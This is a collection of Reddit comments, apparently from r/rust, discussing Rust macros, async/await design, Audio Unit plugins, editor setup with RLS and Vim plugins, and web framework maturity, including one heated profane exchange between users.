It's difficult to say without seeing a complete example. There are two different ways macros can be brought into scope, textual scope and path-based scope. With textual scope, the order that things are defined and imported matters. There is an [in progress PR](https://github.com/rust-lang-nursery/reference/pull/511) with an excellent section that describes how this works: https://github.com/rust-lang-nursery/reference/blob/def43e042cb5348ca70caba4570dd3da1f008728/src/macros-by-example.md#scoping-exporting-and-importing which recently helped me better understand it.
There's a code example of exactly what you're looking for in this async RustRush keynote: https://youtu.be/K_wnB9ibCMg?t=1078 
This isn't an error because there isn't a way to express it as one given Rust's types as they are. The index function here has the type: ``` fn index(&amp;self, index: usize) -&gt; &amp;T ``` That is, it's valid Rust for any index. It definitely should be a warning, though.
Or maybe it should not compile at all right? Would have at least expected a warning after/during compilation. Any linters that would catch this?
i am shadowbanned! :D
That's a really helpful read, thank you.
Woah, that's exactly what I'm looking for! 
Is it weird that I'm happy it goes deeper than just the "It's a name that contains j and s"? 
I've been struggling with Mac AUv3 audio units for 2-3 years now. I have given up on using Swift for them (using Objective-C, Objective-C++ and C++). I have no idea how you would build an AU with a language that xcode doesn't support. It's hard enough using the supported tools (and the documentation is pretty scant). I've got lots of experience at this point but I still can't get my &amp;\*\^$ing UIs to show up in Logic (or Garageband, or Main Stage), although I have gotten AUs to validate (using auval (auval --help in Terminal for more info on that)). The Apple demo AUs don't work right in Logic either... If you'd like to chat about this stuff I'd be happy to. 
PHP is for people in business that should not be in this business in the first place. But there has to be at least one programming language for these guys so that others can avoid them most of the time. I’m just joking.
[Here is a link to the AU developer guide](https://developer.apple.com/library/archive/samplecode/sc2195/Introduction/Intro.html#//apple_ref/doc/uid/DTS40013969-Intro-DontLinkElementID_2). This documentation is kind of tricky to find, and in the code examples that you download from that page you'll want to look at the folders `AUPublic` and `PublicUtility` which contain the helper classes you'll need to compile audio units. I don't think that _technically_ you need those files to compile AUs (most of the code already exists in the AudioToolbox framework), but every third party wrapper I've seen bundles those files. If you want to look at how wrapping an AU in a different language than Objective C/Swift can work, check out the [JUCE wrappers](https://github.com/WeAreROLI/JUCE/tree/master/modules/juce_audio_plugin_client/AU). JUCE also embeds the AU utility classes from Apple, and you can look at the A simpler AU wrapper that I've been digging into the last day or two is from Will Pirkle who wrote [this fantastic book](https://www.amazon.com/Designing-Audio-Effect-Plug-Ins-Processing-ebook/dp/B00ABL64Z8) on plugin development. Second edition is coming out in a couple months, using [his new wrapping code](http://www.aspikplugins.com/). You can download the source and look at how he wrapped AUs in C++. There is minimal Objective C in that example. PS if you do write a wrapper, don't forget to use a build script to link against the CoreAudio, CoreMidi, and AudioToolbox frameworks. Or else it's not going to link.
I would be interested, but only during summer
You have to lock stdin.
Trivial approach that worked for me: https://crates.io/crates/mime_guess
Personally, I like "explicit async, implicit await" myself as well. The problem is, it doesn't work for Rust. We want `async fn` to be an implementation detail that's the same as returning a `Future` directly. There's an expectation that making custom `Future` types will be easier for many library cases, which would then make interop with a world of "explicit async, implicit await" harder. It comes down to that we want the API of `fn join(futures) -&gt; Future&lt;ts&gt;` to be the same as `async fn join(futures) -&gt; ts`. In "explicit async, implicit await", the former would be used as `async || { join(..).await() }` and the latter as `async || { join(..) }`, and we decided that we don't want that split.
&gt; I think this is actually a good example for increased cognitive load. Indeed; it's the kind of papercut that leaves you scratching your head then banging your head on the desk when you finally understand why you lost all those hours. It's also notable that since `()` is just being a special case of tuples, it's pretty reasonable to implement quite a few traits for it. It's an interesting conundrum :)
So the compiler _can_ actually catch this, and it's even error-by-default, but it only works right now when indexing with integer literals: https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=5a409f08d992cc163b9883f8d281c361 &gt; error: index out of bounds: the len is 5 but the index is 10 (actual compile time error) It's the local binding for the index that turns it into a false negative. Probably worth filing an issue for, though I imagine this lint depends heavily on const-folding during MIR lowering so it's going to be limited by the capabilities of that.
It's great [most of the time](https://gfycat.com/smallcarefuldiamondbackrattlesnake) (that was [fixed since then](https://www.reddit.com/r/rust/comments/a5z8yd/my_wishes_for_rust_2019/ebr2yjq)). I find when the concrete type matters, I'll annotate it in the source. If not, I let the IDE hints keep me straight.
I'm not saying that async/await must map 1:1 to MPI, just wondering aloud whether that could be (part of) a possible solution for a "post-MPI" programming model for HPC systems. From what you explains, there shouldn't at least be any performance issues that would prohibit it. So far so good. Going even further off-topic, I don't really understand your comment about an async stack frame being allocated on the stack of the current thread. If, say, function A calls async function B which then returns immediately, then A calls C before starting to poll on B. Then the A-&gt;C call must somehow know that B is next on the stack and jump past it to allocate the stack frame for C to avoid clobbering B's stack frame? And similarly, if C then starts the poll on B, and B calls function D, then somehow it must know that C is after B, and it must jump past it. How on earth can that work? I feel I'm somehow entirely misunderstanding how this things works.. &amp;#x200B; Wrt to matlab, I didn't imply that people would be using matlab to write large-scale parallel software. I'm saying Julia is interesting because it allows writing HPC applications (such as "celeste" that I mentioned in another part of this subthread) in a high level language similar to matlab or python, without having to drop down to an unsafe language like C or Fortran to do the performance-critical parts.
For future reference; I've opened a thread on r/compilers which I'll keep updated with my progress: https://www.reddit.com/r/Compilers/comments/afmhgq/how_to_debug_missed_optimization_in_llvm/ . I did progress, I now have a reduced test case of what: fn triangle(n: u64) -&gt; u64 { let mut count = 0; for i in 0..=n { count += j; } count } should expand + inline to, which optimizes beautifully... ... unfortunately, the code does *not quite* expands + inlines into that; so I'm still chasing after LLVM. It seems to me that @kennytm was incredibly lucky and hit the jackpot without realizing with his implementation oO
Let's just say my industry is full of mechanical engineers. I'm working on embedded systems, so C is still king here and using C++ is very foreign to most people. Embedded in general is very far behind. A lot of targets only have a C compiler. I've even seen some that only have assembly.
You can also use migrations, I suppose.
I didn't know mod order mattered ... the rest of Rust isn't like that right? So that did fix it, my `lib.rs` was this use failure::Error; mod elements; #[cfg(test)] #[macro_use] mod test_crate; mod scanner; use crate::scanner::Scanner; mod parser; and then I changed it to this #[cfg(test)] #[macro_use] mod test_crate; use failure::Error; mod elements; mod scanner; use crate::scanner::Scanner; mod parser; and now it works. Thanks for the reference because it did help understand what was actually happening.
&gt;Many of the weird, dangerous parts of C, like not being able to assume a signed integer is twos complement, is because that **couldnt** be assumed on some valid C targets. For this particular issue, it looks like C2X and C++2X are going to mandate the two's complement representation for signed integers, see [http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2218.htm](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2218.htm) . Of course, that still leaves a boatload of other causes of undefined behavior.
This redditor had right the whole time [Actix-web all the way](https://www.reddit.com/r/rust/comments/7xejhi/supporting_oauth2_in_server_libraries/du82jo9/). It only took 11 months ¯\\\_(ツ)\_/¯ Anyone got another prophecy for the framework I should support in 2020 so that this can be implemented maturely?
How do I create a `Range` from `RangeBounds`? My lower Bound is alwyas `Inclusive(x)`, but the upper one might be `Inclusive(y)` or `Unbounded`... do I need to go through `match`? I'd kinda have expected a simple `From` implementation for `(RangeBound, Rangebound)` or so...
`fn main(){None::&lt;()&gt;.unwrap()}` is also a perfectly cromulent Rust program. It's okay to panic. A warning might be nice, but I would expect this to be the job of an external static analysis tool (or perhaps clippy?) rather than in the compiler; people are cranky enough about compile times as is :)
True, I don't even think of that. Since migrations are arbitrary SQL files, the up one could add some data, while the down one could clear the table.
[https://stackoverflow.com/questions/940905/can-i-read-the-hash-portion-of-the-url-on-my-server-side-application-php-ruby](https://stackoverflow.com/questions/940905/can-i-read-the-hash-portion-of-the-url-on-my-server-side-application-php-ruby) &amp;#x200B; Nevermind. That answers the question. URL info after a hashmark is not even sent to the server.
Closed source? Also, with other PM's, there's release versioning that a project can refer to. Lastly, the registry has packages specific for your language with standards to follow. If it picked off GitHub, is it valid?
`Range` can't handle unbounded; if you need to handle inclusive upper types, you'll need to return both `RangeInclusive` and `RangeFrom`, which is why there's no simple `From` instance.
Wow. Those backends can't even agree on if the GPU is integrated or discrete.
Is this a library for oauth `providers`, or `consumers`?
I'm not aware of other scenarios where mod order matters, but my knowledge is not that deep. Macros are somewhat special.
\&gt; rust seems totally fine compilation-wise to me. If you don't think so then you probably haven't used any large c++ codebase. &amp;#x200B; a lot of game developers don't like C++ build times either, and don't use a lot of C++ features that make them worse, or use untiy build tricks to make them better. It isn't something that is inevitable for debug builds, they could be faster. &amp;#x200B;
Fixed, sorry. 
&gt; I feel I'm somehow entirely misunderstanding how this things works.. Yeah, what do you mean when you say "then A calls C before starting to poll on B" ? An `async fn` returns a `Future` immediately. You don't have to poll a future, you can pass it around, put it on the heap, destroy it, etc. without polling it. You only need to poll it if you want for that computation to execute, and even then, you don't have to poll it to completion. This Future is a state machine. That is, a flat struct, with some fields indicating the current state, and then enough space inside it to fit all stack frames of all the async functions that are involved in producing that future.
Confirmed it's working. Thanks!
Thank you for the answer. I included the code in the main function and then the basic example compiled correctly.
Hmm, ok, thanks :)
But that's mostly useful for populating the data required to run the app, not for testing -- because the all migrations will run when you choose to run them.
It's for OAuth providers on the server side, the consumer side has already been implemented in a variety of other excellent crates ([oauth2](https://docs.rs/oauth2) is a pretty mature one). It would be pretty cool to see both sides tested against each other.
`mpi-sys` is good enough, it is just a thin wrapper over the MPI C headers. `rsmpi` I don't know, haven't used it.
`gfx-backend-gl` is to blame on this case : https://github.com/gfx-rs/gfx/blob/4b38cf2c5fae2c389e3200e6b13e86633d7c25b1/src/backend/gl/src/lib.rs#L274-L283 I don't know OpenGl enough to send a PR for that :/
u/jonhoo has an awesome youtube channel for live rust programming, his dot files can be found here [https://github.com/jonhoo/configs](https://github.com/jonhoo/configs) and the yt channel here [https://www.youtube.com/channel/UC\_iD0xppBwwsrM9DegC5cQQ](https://www.youtube.com/channel/UC_iD0xppBwwsrM9DegC5cQQ). Maybe you can get some inspiration there.
I have `rls` installed from `rustup` and `w0rp/ale` seems to detect and use it automatically. I also have these, but they're probably not needed. let g:ale_completion_enabled = 1 let g:ale_linters = {'rust': ['rls']} let g:ale_fixers = { \ '*': ['remove_trailing_lines', 'trim_whitespace'], \ 'rust': ['rustfmt'], \} let g:ale_fix_on_save = 1 let g:deoplete#enable_at_startup = 1 
Also he has a video about editor setup for rust [Desktop and editor setup for Rust development](https://www.youtube.com/watch?v=ycMiMDHopNc&amp;t=4532s)
&gt; These RFCs, if you do real Rust development, you're going to end up in the RFCs pretty quickly as you go to understand because things are new enough that, even if you're using things that are there, you're going to inevitably come back to the design discussions. he spoke, and then continued to discuss the raw literals RFC that I recently read.
Ale has good LSP support, so why use LanguageClient? Less is more.
&gt; AtomicRefCell [This one?](https://doc.servo.org/atomic_refcell/struct.AtomicRefCell.html) Cool. I wish there were something that kept track of those things that *could* be in the stdlib but are in crates.
Can josephine be used as a bridge between Rust code and Javascript code? The examples I saw had only Rust code
This is more community related than code related: I've seen a bunch of responses from /r/rust that shut people down for asking questions like "what do we need to get Rust to be as good as C?". The responses are usually treating these questions as being zealous toward Rust, which is what I'm confused about. Rust is, from what I've seen at least, far more loved than C, it has modern tooling, promises certain safety guarantees, and from a speed perspective the benchmarks I've seen are pretty much already around the same speed as C, depending what the code does. Obviously benchmarks are not totally objective; sometimes it's faster, sometimes, it's slower, sometimes it's about the same. &amp;#x200B; My question is this: why shouldn't we feel a zealous about Rust? Why shouldn't we have a "we're coming for dat ass" attitude in regard to other languages like C and C++? I know there are certain features of Rust that aren't done, like async/await, that would bring us closer to other aspects of competing languages, but I don't see why simply having the mentality that Rust can/will overtake C/C++ is unhealthy.
Also if you were using intellij-rust you probably would have seen the let binding was annotated with the type Map&lt;...&gt; from the get go which might have implied what was going wrong sooner. I certainly don't know how I could with the type annotations :) 
What is `?Sized` and what does it mean? 
Which is a serious concern for Web code like wasm, where it's likely smaller code size is preferred over minor performance gains in anything that's not a hot loop. 
Maybe tower-web?
&gt; Moreover, I've tried to extensively cover migration for those upgrading from v0.3.1 and plan to repeat these documentations for all future breaking changes. Awesome!
Nice! Does this library support the resource server role as well, where the authorizer is a different service?
I haven't used it myself, but there is a [timeout-readwrite](https://crates.io/crates/timeout-readwrite) crate on [crates.io](https://crates.io/).
http://huonw.github.io/blog/2015/01/the-sized-trait/
Could you link an example of the sort of "shutting down" you're talking about? More generally, 'zealotry' as people usually define it isn't productive because it veers towards making absolute statements that don't hold up in reality and/or disregard the other legitimate considerations that guide things like choosing a language to use in some situation.
Do you intend in the style of OpenID? Then no, the spec has a daunting size that feels overwhelming. Handrolling something which puts authorized tokens into a backend and *only* using the resource components would be possible though. I'd really need more specific information on what you specifically intend here.
Here're some of my thoughts: 1. IMHO creating a Medium article with content that can easily fit into a Reddit post seems to me like overkill. 2. As others say, I'd recommend you using a crate for detecting MIME types instead of doing that by checking file extensions yourself 3. `BoxFut` type is used only once. Personally, I wouldn't define a type alias unless I use it more than once. 4. On line 75, which is a default branch of a `match` statement (which checks the HTTP method) I'd instead respond with a `405 Method Not Allowed` status. 5. On line 45 you check if path contains `../`. The fact is, that you might have a symbolic link in the served directory, and your server will happily send its contents. I'd instead use [`Path.read_link`](https://doc.rust-lang.org/std/path/struct.Path.html#method.read_link), then [`Path.canonicalize`](https://doc.rust-lang.org/std/path/struct.Path.html#method.canonicalize) and finally check if requested path [starts with](https://doc.rust-lang.org/std/path/struct.Path.html#method.starts_with) the [current directory](https://doc.rust-lang.org/std/env/fn.current_dir.html). BTW, currently you can ask your server to send a file with an absolute path. 6. Also, I'd let the user specify a served directory instead of using CWD.
I am trying to create a marker trait `Bool` which needs to be public, so other crates can use it as a bound, but should not be implementable by others. It should only ever be implemented by the types `False` and `True` which are defined in the same crate. My first solution trusts the crate users and merely marks the trait `Bool` as `unsafe`. Of course, anybody could just `unsafe impl` my marker trait and add invalid type-level `Bool`s. My second idea was to use auto traits (feature: `optin_builtin_traits`). But somehow double-negative impls don't seem to work (yet? I know rustc pointed out that this feature is still very buggy). In the code below, the bounds on `T` are simply ignored not leading to my desired behavior. auto trait Bool {} auto trait NotBool {} enum False {} enum True {} impl !NotBool for False {} impl !NotBool for True {} impl&lt;T: NotBool + ?Sized&gt; !Bool for T {} // ^ compiled as if I'd written: // impl&lt;T&gt; !Bool for T {} The first item on the checklist of the [tracking issue](https://github.com/rust-lang/rust/issues/13231) reads _forbid conditional negative impls_. Is this what I experience? Does this mean, it will never work the way I hoped it would? Our is this just a bug in the current implementation? If it's not a bug and the error message is currently missing, is there an alternative to seal traits?
`T: ?Sized` means the type `T` might implement the marker trait `Sized` or it might not. If a type implements `Sized`, it means its size on the stack is known at compile time (examples: `i32`, `Result&lt;Vec&lt;bool&gt;, String&gt;`, `&amp;[u8]`; negative examples: `[u8]`, `str`). By default, `T` in the context of type parameter lists, always means `T: Sized`, so `T: ?Sized` overwrites this behavior additionally allowing `T` to be unsized.
&gt;and it's even error-by-default, but it only \[is caught as an error\] right now when indexing with integer literals If you change your example to const I: usize = 10; let arr = [0i32; 5]; arr[I]; it does fail at compile-time. But if feels weird to me to error-by-default if the code above doesn't use `const` (so the code is OK at a type level).
LanguageClient (or ALE apparently) will talk to RLS. Don't use racer directly, RLS already integrates racer internally. ncm2 is a "completion framework" that is it will integrate LanguageClient and various other sources of completions in an asynchronous way and stuff
I do not necessarily think that Rust is a horrible idea for a first language; you can get by with a lot of `clone()` or `Rc&lt;&gt;` and it won't be "perfect" but it will work. That's fine. Rust is difficult in large part because it _allows_ you to do things "perfectly," or more specifically it allows you to not use any runtime crutch that you don't actually need. But it _does_ allow you to use those runtime crutches to quickly prototype things. (You should see my sketch code, attack of the `clone()`s...) Okay, thought experiment: if you *were* to decide on Rust, this is my recommendation for a few projects that let you use some cool Rust features without necessarily driving yourselves both crazy: 1. Build a few command-line tools. Pick something that lets you deal with file handlers, maybe build something that parses a CSV file and spits out some statistics, calculates a least-squares regression or something along those lines. Better yet, build a command-line tool that takes arguments and prints out various statistics based on the arguments you provide. I'm thinking this would be a good project for someone with a social sciences degree. (FWIW, I'm a musician first, programmer second...) 2. Build a GUI for these functions using something like the [conrod](https://github.com/PistonDevelopers/conrod) crate. Just copy and paste everything from project #1; don't learn about modules and crates yet, because you'll probably have to wrestle with the function signatures from #1. This will teach message passing vs. shared data and multithreading, but you can do a handful of things in just a few hundred lines of code. (And maybe even reuse some stuff from task #1.) 3. Abstract the statistical functions from #1 and #2 into a crate, and then rewrite both projects #1 and #2 using the outside crate instead of just copying and pasting the stuff from one file to another. Those are just a few thoughts! I learned Rust when the only language I really _knew_ was Ruby, and I didn't know anything about traits or really anything about borrowing. It was a battle, but it wasn't impossible. The Rust community is awesome and will help you both learn.
I think adding dependencies to an example *just* to avoid hardcoding a path is overkill 
Another option is `",".contains(c)` - this can be nice for writing things like `fn is_seperator(c: char) -&gt; bool { ";,.[]{}&lt;&gt;():!".contains(c)`.
Now `warp` looks interesting. Let's see if I can get around to it. Of course another maintainer for it would greatly help the cause.
Isn't there a lot of overlap to [https://github.com/swc-project/swc](swc) and [https://github.com/nathan/pax](pax)?
You do a good job, early on, with explaining what each flask ecosystem component does. This helps people who don't know much about that ecosystem. But it looks like you run out of gas about halfway down and I'm left wondering things like, "What's 'it's dangerous'?"
Check https://github.com/ggez/ggez https://www.reddit.com/r/rust_gamedev/comments/agp6i0/the_state_of_ggez_2019/
It's not that big of a dependency though, and will only show up / be compiled when running examples. Sure, it's adding a dependency for user convenience, but why wouldn't it be worth it? I see very little loss in adding a small `dev-dependency`, even compared to a fairly small usability increase.
Ah sorry. It's dangerous is a library for signing data to ensure it can't be tampered with. Client side sessions are the main use case here. I'll edit the post shortly.
Is there a way to use proc macros (Or something else?) To decorate a func so it could return either a single item, or a tuple? I'm attempting to set up an API that in most cases returns a single item, but sometimes returns a tuple, without forcing the user to always return a tuple. This would be to make the API cleaner Unfortunately, it looks like proc_macros are mostly undocumented, so I've no idea how to approach this, other than reading through Serde's code.
Did `actix-web` ever *actually* get their soundness straightened out? The community got really upset about the unsound uses of "unsafe" and then later declared that most of them had been fixed. In a subsequent post about it a couple weeks later, multiple users pointed out that the tracking issue had been closed, despite multiple obvious remaining problems. I think it's really cool that Rust community stays so positive, but that one felt weird to me. People had legitimate concerns and then the entire conversation was swept under the rug to keep things looking nice, and I've had doubts in my head about actix ever since. I hate to write this comment, and I've wanted to ask before, but it was such an unsettling hand-wavey thing from the community... I don't know if I missed some final resolution or something? Between the website redesign, Cargo package-squatting, extremely valuable/passionate community members leaving, the parallels between Rust and Firefox (mis-)management. I freaking love Mozilla but I'm REALLY concerned about Rust and Firefox.
I'm implementing a pathfinding algorithm and I have a trait with associated types which are stored by the pathfinder in a `Node` struct. ```rust trait Cost: Eq + Ord + Add&lt;Output=Self&gt; + Hash {} trait Model { type Control: Clone + Debug; type State: Clone + Debug; type Cost: Clone + Debug + Cost; } #[derive(Debug, Clone)] struct Node&lt;M&gt; where M: Model { state: M::State, control: M::Control, id: Id&lt;M::Cost&gt;, } ``` However, while this gives no compliation warnings, if I try to `println!("{:?}", node)`, i get an error saying the `Model` itself must also implement `Debug`. The same goes for `Clone`. It should be clear that the associated types meet the requirements so why does the `Model` need the bound as well? Is this a limitation of Rust or of the derive mechanism? [Minimal example on the playground.](https://play.integer32.com/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=2b417e99053451bfd2f2181e61b33b65)
&gt;I have similar crate for generating test cases: https://crates.io/crates/test-case-derive &gt; &gt;Your macro is reading files, in my case you must explicitly provide file name for each test. I think it is possible to merge those ideas just like in NUnit in C#, which has TestCase and TestCaseSource. Looks really nice, I like the way "test-case-derive" is declaring tests :)
By chance would you know how to go about patching it? I've forked the library but I'm not quite sure how to change the [build.rs](https://build.rs)(I presume that's what would have to change) to fix it.
There is and there isn't. Both `swc` and `pax`implement JavaScript parsers, ASTs and writers but they are dedicated tools, they have jobs. With these three crates I am hoping to enable people to build tools like `swc` or `pax` who don't want to have to build their own parser and AST. 
Like I said it's probably something to do with const-folding; at the point where this error is being thrown the `const I` is expanded to its rvalue so it's indistinguishable from the form I demonstrated. In contrast, `let` bindings are expected to almost always have their values determined at runtime so they aren't subject to the const-folding that `rustc` does. LLVM in this case of course will likely optimize out the binding and just use the rvalue since its analysis can determine that the value is always the same. However, at that point it's long past the time for emitting lint errors.
Web frameworks are still in progress because Rust is unfinished in areas where framework api can benefit from--known issues stemming back from the Rust 1.0 release. [This](https://www.reddit.com/r/rust/comments/aho6xj/where_do_you_think_rust_will_be_in_3_years/eego9og)/r/rust post rather nicely captures a good vision for where the community would like rust to be in 3 years. A lot of that impacts what kind of frameworks can be built. (Particularly in stable rust.) &amp;#x200B; I'm thinking that we're two years away from a significant ecosystem being built around a particular web framework. (and this estimate is assuming Chalk, ATCs, and maybe specialization are completed in 2019, which seems a big stretch to be). I'd love to be wrong here.
In your book, on your examples, you should add use statements. There's a run button for the various examples that don't run due to missing use statements.
yeah, i think u want r/playrust ..
i am getting tired of redirecting rust players to their proper rust subreddit: r/playrust ..
Signatory author here. Is this "It's Dangerous"? https://pythonhosted.org/itsdangerous/ If so... it's using somewhat weird terminology. Digital signatures generally refer to asymmetric primitives (e.g. ECDSA and Ed25519 as supported by Signatory), whereas in the case of "itsdangerous": &gt; Internally itsdangerous uses HMAC and SHA1 for signing by default and bases the implementation on the Django signing module. This library appears to use HMAC-SHA-1, which is an obsolete algorithm (SHA-1 which has known collisions, which can't be easily exploited in the context of HMAC, but is still a bad idea to continue to use). It's more of a message authentication code (MAC) library the Django "signatures" it's built on seems to support a number of bespoke formats. For these sorts of use cases, I personally prefer authenticated encryption. That said, I wouldn't personally consider that a "signature" library. Signatory isn't just "lower level", it's an actual digital signature library that provides support for ECDSA and Ed25519.
The error I get when I run your playground link is that `struct Test` doesn't implement `Debug`. If I add a derive for that it compiles and runs.
HMAC-SHA1 is fine for this purpose. A longer hash is suboptimal for what this is used for (signed urls / cookies). 
Might not be the easiest thing to work from, but my NeoVim setup is open source in Ansible: https://github.com/naftulikay/ansible-role-vim-personal The only thing not contained there is installing Rust via rustup and RLS, which are pretty trivial to get going.
I'm not sure that those language features will really impact framework design that much. Do you have any specific examples of how you'd expect it to change current frameworks?
I've been there before, I took lots of steps to set up my environment in a way that works nicely. &amp;#x200B; I use [Deoplete](https://vimawesome.com/plugin/deoplete-nvim) for auto-completing everything, it's fast and works nicely. In [my init.vim](https://gitlab.com/Gahr/dotfiles/blob/master/init.vim) I have some custom configuration for that. To me I've found a mix between [LanguageClient](https://vimawesome.com/plugin/languageclient-neovim) and [Ale](https://vimawesome.com/plugin/ale) to be working the best, I also have [rust.vim](https://vimawesome.com/plugin/rust-vim-superman) installed. The config for Ale pretty standard, defined a fixer, defined linters (it uses RLS under the hood too). But I changed my LanguageClient plugin's setup a bit, I tell it to not show diagnostics. The LanguageClient only shows RLS errors/warnings/etc. If you turn these off and then use Ale to show the diagnostics with cargo on top you get a lot more diagnostics. This method has worked best for me. &amp;#x200B; Tl;dr: Here's the link to [my dotfiles](https://gitlab.com/Gahr/dotfiles).
I know Rocket uses the nightly/experimental version of specialization, and specialization is (as far as I know) blocked by Associated Type Constructors (ATC). Well, I stand corrected: [https://github.com/SergioBenitez/Rocket/issues/19](https://github.com/SergioBenitez/Rocket/issues/19) states that the uses are specialization are easy to remove. There's also the async--await work, which is being worked on currently (it's on nightly). The consensus is that this will be finished during 2019. After thinking it over, I think async--await support for web frameworks is the single feature the community is waiting on.
Take a look at [coreutils](https://github.com/uutils/coreutils/blob/master/src/echo/echo.rs).
I can't use crates unfortunately
I've always been interested in FP, I've always had some kind of attraction, especially after I've been more exposed to FP concepts in Rust. I do understand that "Haskell makes you a better developer" because it makes you reason differently about the code you're writing. But beyond all that, how practical is Haskell when developing a real-world piece of software? When I learn a language I'd like to use it for something too, maybe a command line tool, maybe a simple web API, maybe something different. How fit is Haskell for these jobs?
&gt;You are being downvoted because you are being unnecessarily aggressive, which is NOT welcome. Playing the victim after initiating the aggression is not counting in your favor either. I strongly disagree. More than anything else I was taken aback by how it seemed to me that *nobody* understood that I was *only* talking about crates that required external assets for there examples. Everyone started talking about "what most Rust users prefer", which I was **never** calling into question, and was never relevant at any point because I was never suggesting that the base-level directory layouts be changes, just that authors of the particular kind of crate I was mentioning should perhaps slightly reconsider where they put their images/3D models/e.t.c folder.
Almost everyone who responded here started arguing about something that OP wasn't talking about and that doesn't even make sense in relation to it though. It remains true that whether or not anyone uses `cargo run` doesn't actually matter, because people who hardcode paths into the example apps can hardcode those paths to be *anywhere*.
Hearing how 1 min iteration time is way too long is hilarious. I just shipped a UE4 game that takes a couple minutes to compile and get into the editor. I'd love to live in a world where 1 min iteration is unacceptable.
A lot of these aren't that cumbersome to implement yourself: Encrypted cookies with Rocket, for example, are about a half dozen lines of code. Stick a UUID in there and you have yourself sessions. I've been actively trying to avoid username / password schemes in sites I've built with Rust because, come on, its 2019, nobody has time for those. [WebAuth](https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API) would hopefully expand over time into something much more practical for the average user to take advantage of but until then I wrote an [OpenID crate](https://crates.io/crates/oidc) to handle logins. Diesel devs have talked several times that the explicit up / down written SQL model is intentional and that its why they don't have auto migrations. In way simplified terms you would need to have a really gross proc macro / compiler plugin / build script requirement to find all your Diesel marked data structures, generate migrations, and then generate the Diesel schema after that migration is run. Its probably doable, but its not close to a trivial problem and writing your own create / delete / alter statements aren't that hard to write, especially when aware of the limited subset of SQL types Diesel supports. As someone who has written a lot of Flask and Django sites, and even played with Sanic, Bottle, and several other Python frameworks for funsies, the ergonomics of Rocket are there enough to make it a joy to use and Rust is an extremely powerful language for having Serde, its typed guarantees, and rigorous error handling. I still need to try Actix some time, bit I'm just having too much fun with Rocket nowadays.
I'm not going to maintain it, but if it's even vaguely maintained I'll find uses for it, and whenever I use things I tend to find bugs and fix them.
Futures are currently being stabilized in the futures-preview crate before being moved into standard. If you're looking to learn more about them this might be a good place to read about them: https://docs.rs/futures-preview/0.3.0-alpha.12/futures And a full guide on futures: https://rust-lang.github.io/async-book/execution/chapter.html Also I believe they no longer have task-local contexts, while they used to at some point last year.
Go fuck yourself with your embarrassingly overthought passive aggressive bullshit. There's nothing up for debate in here that requiers *anybody* to be righting new code or to open github issues. It's like this fucking language is a magnet for all of the most nitpicky anal retentive wet blankets in the world. It's not that fucking import. Fuck you. Deleting this account now, bye.
It is just planning. No kinds of `await` syntax in that issue is supported.
Yes, but `Test` is _never_ printed as only the associated types are even fields on the `Node`, so why do I need to derive `Debug` when `Test` is not ever printed by `Node`?
Through the process, ideally we find some sort of consensus on the best choice. [salt] Given how bikesheddable any purely syntax issue is, it'll get 1000 comments, burn out anyone trying to help manage the flood, get locked, then the language team will pick one they think is good and will earn the least hate, then the community will complain and get used to it in a few months, as happened with `?`. [/salt] If all goes well, this process will lead us to the optimal choice. And in any case, it'll definitely drive a 2019 effort to make large and loud things like this more manageable, I hope. I just hope the chaotic caucus doesn't drive off people from participating in the community. It's not always this loud; but per the bikeshed principle, the more trivial the decision the more people will argue loudly about it. It's real easy to argue the bikeshed color.
I literally said as much... &gt; SHA-1 which has known collisions, which can't be easily exploited in the context of HMAC, but is still a bad idea to continue to use
So `#[derive(Debug)]` adds an implicit `Debug` bound to all type parameters of the type it's applied to. So the result is `impl&lt;M: Debug&gt; Debug for Node&lt;M&gt;`. There's no real way to disable this so the only solution is to implement manually, which really isn't too painful.
The rust language server (rls) is an implementation of [language server protocol](https://langserver.org/) (lsp). An lsp server essentially looks at code and gives all sorts of information about it that would be useful for a programmer currently writing the code (autocomplete, highlighting errors or suggested alternatives, etc) and some related features like automatic code formatting can be handled by the lsp server as well. But in order to *use* an lsp server you need some sort of support in your text editor. Your text editor has to know how to run an lsp server, submit the current code you're editing to that lsp server, get information back from that server and render red underlines on errors or alter the file when you ask for autoformatting or whatever else: that's where ale and LanguageClient come in. LanguageClient and ale are two different plugins for vim/neovim that do what I mentioned above: they'll start and work with an lsp server (rls in the case of rust) and give you that information in vim. Theoretically there's no need for two different plugins to exist, but differences in opinion often mean you end up with 2+ plugins for the same sort of thing, and sometimes it's worth trying a few out to see what you like. What about ncm2 or (I'm adding this one even though you didn't mention it specifically) [deoplete](https://github.com/Shougo/deoplete.nvim)? Well out-of-the-box vim/neovim has an autocompletion sort of thing, but a few alternatives have come out as plugins to address issues or add features to that built in stuff. ncm2 and deoplete provide an autocompletion system for vim/neovim. I haven't used ncm2 myself but I know deoplete out of the box does some nice things like read all the stuff in the file you're currently editing and suggest words you've typed before in the same file. That's a very simplistic system, though. People often want smarter systems that understand you're writing rust, and understands that `std::sync::` contains things like `Arc` and `Mutex` and offer those suggestions to you. As I said before: rls provides this sort of autocompletion suggestions, you just need some glue like ale or LanguageClient in the editor to know how to use rls or other lsp servers and be responsible for actually marking the errors in the editor or showing you suggestions and all that. Those glue plugins, though, don't want to reinvent the wheel if they don't have to, so as one example: when LanguageClient wants to show you autosuggestion if it sees you also have deoplete installed it'll use the features of deoplete to let deoplete know that it can help it by providing autocomplete suggestions. ale seems to just use the built-in autocompletion utility. So as a recap of the ideas and a particular example: * deoplete sees you typed `std::sync::` and it wants to help provide autocompletions * it asks LanguageClient, which registered with deoplete as a source of suggestions, and tells it to help complete `std::sync::` * LanguageClient asks rls what sort of completions make sense * rls says that `Arc`, `Mutex`, etc. are reasonable completions * LanguageClient reports that back to deoplete * deoplete worries about drawing on the screen all the suggestions for you * you press enter deplete is responsible for actually inserting the suggestion. Similar to deoplete is ncm2: it provides suggestions for autocompletion for you. ncm2-racer is a plugin that will use racer to provide intelligent suggestions for how to complete rust code so that ncm2 can give you more helpful completions when writing rust... but what is racer? racer is a program that figures out intelligent suggestions for rust code. That's about it. It's actually used by rls internally - in the same way that LanguageClient and ale don't want to have to write their own autocompletion system if there's already one they can use more easily, rls used the existing tool racer for making decisions about code completion. vim-racer seems to be a fairly simple plugin to let vim use racer without any intermediate other plugins, and `rust.vim` doesn't seem to provide any autocompletion, but will connect you with 